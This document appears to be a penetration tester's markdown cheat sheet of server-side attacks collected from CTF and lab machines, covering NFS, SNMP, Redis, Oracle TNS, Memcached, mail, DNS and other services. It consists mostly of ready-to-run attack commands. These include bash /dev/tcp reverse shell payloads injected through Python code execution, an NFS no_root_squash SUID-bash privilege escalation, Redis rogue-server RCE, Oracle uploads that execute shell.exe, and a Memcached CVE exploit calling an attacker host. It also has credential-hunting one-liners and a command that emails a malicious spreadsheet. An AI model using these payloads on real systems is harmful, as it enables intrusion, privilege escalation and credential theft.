## Server-Side attacks

### <ins>NFS</ins>

- > "Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user."
- Ports: 2049, 111
- Show the NFS server’s export list: `showmount -e <target>`
  - The same with nmap: `nmap –sV –script=nfs-showmount <target>`
- Mount an NFS share: `mount -o rw,vers=2 <target>:<share> <local_directory>`
  - `mount -t nfs [-o vers=2] 192.168.182.216:/srv/share /tmp/mount -o nolock`
  - `sudo mount -t nfs 192.168.182.216:/share /tmp/mount`
  - `mount -o rw,vers=2 192.168.182.216:/srv/share /tmp/mount`
  - If the mount is restricted to localhost, try with an ssh tunnel or similar
- See [Task 19 - Linux PrivEsc | TryHackMe](https://tryhackme.com/room/linuxprivesc)
- One liner to extract credentials
  - `grep -rnlE 'username|password|admin' /path/to/directory | grep -Ev '\.css$|\.html$|\.js$' | xargs -I {} grep -nHE --color=always 'username|password|admin' {} | sed -E 's/(username|password|admin)/\x1b[31m\1\x1b[0m/g'`

**Root Squashing**
- Root Squashing is how NFS prevents an obvious privilege escalation
- `no_root_squash` turns root squashing off
- example: `/srv/share  localhost(rw,sync,no_root_squash)`
  ```
  showmount -e 192.168.182.216
  sudo mount -t nfs 192.168.182.216:/share /tmp/mount
  sudo mount -t nfs 192.168.182.216:/srv/share /tmp/mount -o nolock
  mount -o rw,vers=2 192.168.182.216:/srv/share /tmp/mount
  ```
  1. VICTIM: `cp /bin/bash .`
  2. KALI: `sudo chown root:root bash; sudo chmod +xs bash`
  3. VICTIM: `./bash -p`
- if you can't mount because restricted to localhost only and you have access to the victim's machine, try ssh tunneling:
  ```
  ssh -N -L localhost:2049:localhost:2049 kali@192.168.45.195
  ssh -N -L 127.0.0.1:8443:127.0.0.1:8443 kali@192.168.45.245
  ```
  - modify `/etc/hosts` with `echo "192.168.45.195 localhost" >> /etc/hosts`
- Check: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe


### <ins>IKE - Internet Key Exchange</ins>

- common port: `500/udp-tcp`
  - nmap sometimes says `isakmp?`
- Initial scan
  - `ike-scan IP`
- see also SNMP
  - port `161/udp-tcp`


### <ins>SNMP</ins>

- if you see this, maybe with IKE, can mean that this service is used to block any interaction from external hosts
  - if you can configure it, you can bypass this kind of proxy and rerun nmap
- common port: `161/udp-tcp`
- `snmpwalk -v2c -c public IP`
  - you might find a md5 or ntlm password
If you have found a password
1. `echo 'IP : PSK "PASSWORD1234"' >> /etc/ipsec.secrets`
2. `sudo gedit /etc/ipsec.conf`
3. `sudo ipsec stop`
4. `sudo ipsec start --nofork`
- See Hack The Box / Conceal
- When you run again nmap, use `-sT`


### <ins>NodeJS</ins>

- Reverse shell: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs
- If you find JS injection, you find RCE. Try this payload: `(function(){return 2+2;})();`
  - if the result is `4`, then it is a good sign


### <ins>Python</ins>

- https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1
- check if there is the library 'os', you can achieve RCE with `system('bash -i >& /dev/tcp/192.168.45.221/445 0>&1')`
- alternatives
  - `__import__('os').system('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')#`
  - `curl -X POST --data-urlencode 'code=__import__("os").system("bash -i >& /dev/tcp/192.168.49.195/445 0>&1")#' http://192.168.195.117:50000/verify`
  - `code=__import__('os').system('bash+-i+>%26+/dev/tcp/192.168.49.195/445+0>%261')%2`


### <ins>Redis 6379</ins>

- `nmap --script redis-info -sV -p 6379 IP`
- `redis-cli -h IP`
  - try command `info`
  - if no login, run the command: `config get *`
- To dump the db: `redis-utils` and `redis-dump`
- Deafult config file: `/etc/redis/redis.conf`

**SSRF**
- eval "dofile('//myip/share')" 0
  - run also with `sudo impacket-smbserver -smb2support share /home/kali/Downloads/`
  - `hashcat -m 5600 -a 0 user.hash /usr/share/wordlists/rockyou.txt`

**Possible RCEs, see with searchsploit**
- [Redis Rogue Server](https://github.com/n0b0dyCN/redis-rogue-server)
  - if you don't need user:password, `python3 redis-rogue-server.py --rhost RHOST --lhost LHOST`
- [RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand)
- other RCE (combine the two commands):
  - python redis-rce.py -r 192.168.220.166 -L 192.168.45.181 -f exp.so -a 'Ready4Redis?'
  - python3 redis-rogue-server.py --rhost 192.168.220.166 --rport 80 --lhost 192.168.45.181 --lport 7080 --exp=exp.so -v --passwd='Ready4Redis?'

**Resources**
- [6379 - Pentesting Redis | HackTricks](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis)
- [4 :6379 redis Writeup](https://kashz.gitbook.io/proving-grounds-writeups/pg-boxes/sybaris/4-6379-redis)
- [Readys Write Up — Proving Grounds](https://medium.com/@C4berowl/readys-write-up-proving-grounds-e066074eed)



### <ins>Oracle TNS</ins>

- HackTricks: https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener
- Common ports: `1521`, `1748`
- TNS poison: `python3 odat.py tnspoison -s <IP> -p <PORT> -d <SID> --test-module`

1. Enumeration - version
- `nmap --script "oracle-tns-version" -p 1521 -T4 -sV IP`
- `tnscmd10g COMMAND -p 1521 -h IP`
  - commands: `ping`, `version`, `status`, `services`, `debug`, `reload`, `save_config`, `stop`
  - if it gives you an error, try '--10G'
  - See description of errors here: https://docs.oracle.com/database/121/ERRMG/TNS-00000.htm

2. Enumerate SID
- `hydra -L '/home/kali/Documents/lists/oracle-tns/sids-oracle.txt' -s 1521 IP oracle-sid`
- `python3 odat.py sidguesser -s IP -p 1521`

3. Password guess
- `python3 odat.py passwordguesser -s IP -p 1521 -d XE --accounts-file accounts/accounts_large.txt`
- `nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n IP`

4. Upload arbitrary files
- `python3 odat.py utlfile -s IP -p 1521 -U scott -P tiger -d XE --sysdba --putFile c:/ shell.exe shell.exe`

5. Execute files
- `python3 odat.py externaltable -s IP -p 1521 -U scott -P tiger -d XE --sysdba --exec c:/ shell.exe`


### <ins>Memcached</ins>

- `telnet IP 11211`
- `msf > use auxiliary/gather/memcached_extractor`
- `memcdump --servers=IP`
- `memccat --servers=IP <item1> <item2>`
- CVE-2021-33026 RCE
  - `python cve-2021-33026_PoC.py --rhost IP --rport 5000 --cmd "curl http://ATTACKERIP" --cookie "session:de43fcb3-d960-4851-b14a-f7da3993e33d"`


### <ins>SMTP / IMAP</ins>

- `sudo perl ~/Documents/scripts/smtp/smtp-user-enum.pl -M VRFY -U /home/kali/Documents/lists/common_list/usernames.txt -t IP`
- Connect to imap
  ```
  telnet IP 110
  USER sales
  PASS sales
  list         <# list messages  #>
  retr 1       <# show message 1 #>
  ```
- connect to smtp
  ```
  nc -v IP 25
  helo test
  MAIL FROM: it@postfish.off
  RCPT TO: brian.moore@postfish.off
  DATA
  [write now the body of the email]
  <CR><LF>.<CR><LF>
  QUIT
  ```
- Another IMAP connection
  ```
  nc IP 143
  tag login jonas@localhost SicMundusCreatusEst
  tag LIST "" "*"
  tag SELECT INBOX
  tag STATUS INBOX (MESSAGES)
  tag fetch 1 (BODY[1])
  ```
- `sendemail -f 'jonas@localhost' -t 'mailadmin@localhost' -s IP:25 -u 'Your spreadsheet' -m 'Here is your requested spreadsheet' -a bomb.ods`



### <ins>113 ident</ins>

- `nc -vn IP 113`
- `ident-user-enum IP 113`
  - you can enumerate users for every port
  - > "Is an Internet protocol that helps identify the user of a particular TCP connection"
- https://book.hacktricks.xyz/pentesting/113-pentesting-ident



### <ins>FreeSWITCH</ins>

- Discover password: `/etc/freeswitch/autoload_configs/event_socket.conf.xml`


### <ins>Umbraco</ins>

- Umbraco Database Connection Credentials: `strings App_Data/Umbraco.sdf | grep admin`
  - See these resources:
    - https://stackoverflow.com/questions/36979794/umbraco-database-connection-credentials
    - https://app.hackthebox.com/machines/234


### <ins>VoIP penetration test</ins>

- `python3 sipdigestleak.py -i IP`
  - Find credentials
- `sox -t raw -r 8000 -v 4 -c 1 -e mu-law 2138.raw out.wav`
  - decrypt raw voip data


### <ins>DNS</ins>

**DNS zone transfer**
- `dig axfr @<DNS_IP>`
- `dig axfr @<DNS_IP> <DOMAIN>`
- `fierce --domain <DOMAIN> --dns-servers <DNS_IP>`
- `host -l domain.com nameserver`
- `dnsrecon -d domain.com -a`
- `dnsrecon -d domain.com -t axfr`
- `dnsenum domain.com`
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns#zone-transfer
